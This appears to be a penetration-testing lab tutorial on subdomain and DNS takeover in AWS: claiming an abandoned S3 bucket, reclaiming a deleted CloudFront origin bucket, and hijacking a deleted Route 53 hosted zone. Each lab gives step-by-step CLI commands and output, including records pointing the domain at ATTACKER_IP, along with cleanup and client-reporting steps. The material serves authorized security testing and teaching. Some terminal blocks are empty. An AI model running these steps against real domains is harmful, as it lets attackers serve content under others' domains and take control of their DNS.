A "dangling" CNAME exists when a DNS record points to a resource that no longer exists. The subdomain still resolves, but the destination is unclaimed — meaning an attacker can create the resource and serve content under the target's domain.
Cleanup: This lab is passive enumeration only — no AWS resources were created. Delete local output files: rm subs.txt cnames.txt takeovers.txt vuln.txt fingerprints.json
Objective: Take over a subdomain by claiming the abandoned S3 bucket its CNAME record still points to.
Prerequisites:
  • AWS CLI v2 installed and configured with an attacker-controlled AWS account
  • Dangling S3 CNAME identified from Lab 1 (e.g., assets.targetcorp.com → assets.targetcorp.com.s3.amazonaws.com)
  • The target DNS CNAME uses the virtual-hosted-style naming pattern where the bucket name matches the subdomain exactly
  • Authorized engagement scope confirming subdomain takeover testing is permitted
  • Note: This technique requires creating a bucket in your own AWS account. AWS account creation requires a valid payment method.
1
Verify the CNAME is dangling — DNS resolves to S3, but the bucket no longer exists. The NoSuchBucket XML error from S3 is the definitive confirmation.
Terminal
$ dig +short assets.targetcorp.com
assets.targetcorp.com.s3.amazonaws.com. 52.217.44.100
$ curl -s -o /dev/null -w "%{http_code}" http://assets.targetcorp.com
404
$ curl -s http://assets.targetcorp.com
<?xml version="1.0" encoding="UTF-8"?> <Error> <Code>NoSuchBucket</Code> <Message>The specified bucket does not exist</Message> <BucketName>assets.targetcorp.com</BucketName> </Error>
2
Create an S3 bucket with the exact name the CNAME points to. The bucket name must match the CNAME target precisely. Specify the correct region — for virtual-hosted-style CNAMEs the bucket must be created in the region that matches the DNS endpoint.
Terminal
$ aws s3 mb s3://assets.targetcorp.com --region us-east-1
make_bucket: assets.targetcorp.com
3
Upload a proof-of-concept page to demonstrate control over the subdomain. Keep the content clearly marked as a security assessment PoC.
Terminal

Enable S3 static website hosting so the bucket serves HTTP content at the target subdomain.

Objective: Take over a CloudFront distribution that points to an unclaimed (deleted) S3 bucket as its origin, allowing an attacker to serve arbitrary content through the target's CloudFront distribution.
Prerequisites:
  • AWS CLI v2 installed and configured with an attacker-controlled AWS account
  • A CloudFront distribution identified whose S3 origin bucket has been deleted (the distribution still exists and the CNAME alias is still live, but the origin bucket does not)
  • The existing CloudFront distribution's origin domain name (e.g., targetcorp-cdn-assets.s3.amazonaws.com)
  • Authorized engagement scope confirming CloudFront/S3 testing is permitted
  • Note: This technique exploits a misconfiguration on the existing CloudFront distribution, not a new distribution creation. It does not require domain validation bypass.
1
Identify a CloudFront distribution whose S3 origin bucket has been deleted. The distribution is still active and serving requests, but the origin returns NoSuchBucket.
Terminal
$ dig +short cdn.targetcorp.com
d111111abcdef8.cloudfront.net. 13.35.22.187
# Check the response — a 403 from CloudFront or a proxied NoSuchBucket from S3 both indicate a potentially exploitable origin
$ curl -sI https://cdn.targetcorp.com
HTTP/2 403 server: CloudFront x-cache: Error from cloudfront via: 1.1 abc123.cloudfront.net (CloudFront) x-amz-cf-id: XXXXXX
# Probe the origin directly to confirm the S3 bucket is gone
$ curl -s "https://targetcorp-cdn-assets.s3.amazonaws.com/"
<?xml version="1.0" encoding="UTF-8"?> <Error> <Code>NoSuchBucket</Code> <Message>The specified bucket does not exist</Message> <BucketName>targetcorp-cdn-assets</BucketName> </Error>
2
Claim the deleted S3 bucket by recreating it in your attacker-controlled AWS account. The bucket name must exactly match the origin bucket name the existing CloudFront distribution is configured to use.
Terminal
# Create the bucket with the same name as the deleted origin bucket
$ aws s3 mb s3://targetcorp-cdn-assets --region us-east-1
make_bucket: targetcorp-cdn-assets
# Disable Block Public Access so we can upload a public PoC
$ aws s3api put-public-access-block \ --bucket targetcorp-cdn-assets \ --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false"
(no output on success)
3
Upload a proof-of-concept HTML file to the reclaimed bucket and make it publicly readable.
Terminal
$ cat <<'EOF' > index.html <!DOCTYPE html> <html> <head><title>CloudFront S3 Origin Takeover PoC</title></head> <body> <h1>CloudFront S3 Origin Misconfiguration PoC</h1> <p>Domain: cdn.targetcorp.com</p> <p>Content served from attacker-controlled S3 bucket via existing CloudFront distribution.</p> <p>Assessment Date: 2024-03-16</p> <p>Assessor: [Your Name]</p> </body> </html> EOF
$ aws s3 cp index.html s3://targetcorp-cdn-assets/ --acl public-read
upload: ./index.html to s3://targetcorp-cdn-assets/index.html
4
Apply a bucket policy to allow public read access from any principal (required for CloudFront to serve the content without an OAC/OAI).
Terminal
$ cat <<'EOF' > bucket-policy.json { "Version": "2012-10-17", "Statement": [ { "Sid": "PublicRead", "Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::targetcorp-cdn-assets/*" } ] } EOF
$ aws s3api put-bucket-policy \ --bucket targetcorp-cdn-assets \ --policy file://bucket-policy.json
(no output on success)
5
Verify the takeover — the existing CloudFront distribution now fetches content from your bucket and serves it at the target's CDN subdomain. Allow a few minutes for CloudFront's cache to refresh.
Terminal

server: CloudFront x-cache: Hit from cloudfront

This technique exploits a CloudFront distribution whose S3 origin bucket was deleted but the distribution itself was not. Because the distribution still exists and serves requests, and any AWS account can create a bucket with the same name, an attacker who reclaims the bucket name now controls the content served by the target's own distribution. This is distinct from a new-distribution CNAME alias attack. Modern CloudFront distributions using Origin Access Control (OAC) are not vulnerable to this specific variant because OAC ties the origin to a specific account.
Cleanup:
  1. Remove all objects: aws s3 rm s3://targetcorp-cdn-assets --recursive
  2. Delete the bucket: aws s3 rb s3://targetcorp-cdn-assets --force
  3. Delete local files: rm index.html bucket-policy.json
  4. Report the finding to the client so they can delete or reconfigure the CloudFront distribution to point to a new, controlled origin bucket
Objective: Hijack DNS for a domain whose Route 53 hosted zone has been deleted but whose NS delegation records at the registrar still point to Route 53 nameservers.
Prerequisites:
  • AWS CLI v2 installed and configured with an attacker-controlled AWS account
  • Tools installed: dig
  • Target domain confirmed to have NS records pointing to Route 53 nameservers (awsdns-*) at the registrar level
  • Authorized scope confirmed — this attack requires active zone creation in your AWS account
  • Understanding of the low probability: Route 53 has approximately 2,000 distinct NS delegation sets. The chance of receiving the exact matching set on a given attempt is roughly 0.05%. Automated looping is required in practice.
1
Check the NS records for the target domain at the registrar level. If they delegate to Route 53 nameservers (awsdns-*), the hosted zone may have been deleted while the registrar delegation was left intact.
Terminal
$ dig NS abandoned-target.com
;; ANSWER SECTION: abandoned-target.com. 86400 IN NS ns-1234.awsdns-56.org. abandoned-target.com. 86400 IN NS ns-789.awsdns-01.net. abandoned-target.com. 86400 IN NS ns-456.awsdns-78.co.uk. abandoned-target.com. 86400 IN NS ns-321.awsdns-90.com.
2
Confirm the hosted zone no longer exists by querying the specific Route 53 nameservers directly. A SERVFAIL response means the authoritative nameserver failed to return a valid answer — this happens when the hosted zone has been deleted from Route 53 while the NS records remain at the registrar. This is the condition we will exploit.
Terminal
$ dig A www.abandoned-target.com @ns-1234.awsdns-56.org
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 45678 ;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
$ dig A admin.abandoned-target.com @ns-789.awsdns-01.net
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 12345 ;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
# SERVFAIL from the authoritative Route 53 nameserver confirms no hosted zone exists for this domain. # This means a resolver cannot get an authoritative answer — the condition we need to exploit.
3
Create a new hosted zone for the target domain in your attacker-controlled AWS account. Route 53 assigns a random delegation set from its pool of ~2,000 NS sets. You need to receive the exact same four nameservers the registrar is currently delegating to. If you don't match, delete the zone and try again.
Terminal
$ aws route53 create-hosted-zone \ --name abandoned-target.com \ --caller-reference $(date +%s)
{ "HostedZone": { "Id": "/hostedzone/Z0123456789ABC", "Name": "abandoned-target.com.", "CallerReference": "1710600000" }, "DelegationSet": { "NameServers": [ "ns-1234.awsdns-56.org", "ns-789.awsdns-01.net", "ns-456.awsdns-78.co.uk", "ns-321.awsdns-90.com" ] } }
# Compare assigned NS records against the registrar delegation NS records from Step 1. # If they match — proceed. If not, delete this zone and create a new one. # aws route53 delete-hosted-zone --id Z0123456789ABC
4
Once the nameservers match, create DNS records in your hosted zone. Your zone is now authoritative for the domain because the registrar delegates to the same nameservers you control.
Terminal
$ aws route53 change-resource-record-sets \ --hosted-zone-id Z0123456789ABC \ --change-batch '{ "Changes": [ { "Action": "CREATE", "ResourceRecordSet": { "Name": "admin.abandoned-target.com", "Type": "A", "TTL": 300, "ResourceRecords": [{"Value": "ATTACKER_IP"}] } }, { "Action": "CREATE", "ResourceRecordSet": { "Name": "abandoned-target.com", "Type": "A", "TTL": 300, "ResourceRecords": [{"Value": "ATTACKER_IP"}] } } ] }'
{ "ChangeInfo": { "Id": "/change/C0ABCDEF123456", "Status": "PENDING", "SubmittedAt": "2024-03-16T14:30:00Z" } }
5
Verify the hijack by querying the DNS records you created. Successful resolution to your IP confirms full DNS control over the domain.
Terminal
$ dig A admin.abandoned-target.com
;; ANSWER SECTION: admin.abandoned-target.com. 300 IN A ATTACKER_IP
$ dig A abandoned-target.com
;; ANSWER SECTION: abandoned-target.com. 300 IN A ATTACKER_IP
# Full domain control achieved — can create A, MX, TXT, CNAME records at will

This attack has a very low per-attempt success rate (~0.05%) because it depends on Route 53 assigning the exact same NS delegation set that the registrar is currently pointing to. The prerequisite is that the domain's registrar NS records still delegate to Route 53 nameservers for a zone that has since been deleted. SERVFAIL in Step 2 does not prove the attack will succeed — it only confirms the zone is gone from Route 53. The registrar's delegation must also still be intact. In practice, attackers automate the zone creation/deletion loop. AWS has implemented mitigations for some edge cases, but unpatched configurations remain exploitable.
Cleanup:
  1. Delete all resource record sets from the zone (excluding the default SOA and NS records): aws route53 change-resource-record-sets --hosted-zone-id Z0123456789ABC --change-batch '{"Changes":[{"Action":"DELETE","ResourceRecordSet":{"Name":"admin.abandoned-target.com","Type":"A","TTL":300,"ResourceRecords":[{"Value":"ATTACKER_IP"}]}}]}'
  2. Delete the hosted zone: aws route53 delete-hosted-zone --id Z0123456789ABC
  3. Report to the client: they must update the registrar NS records to remove the Route 53 delegation or point to a new, active hosted zone
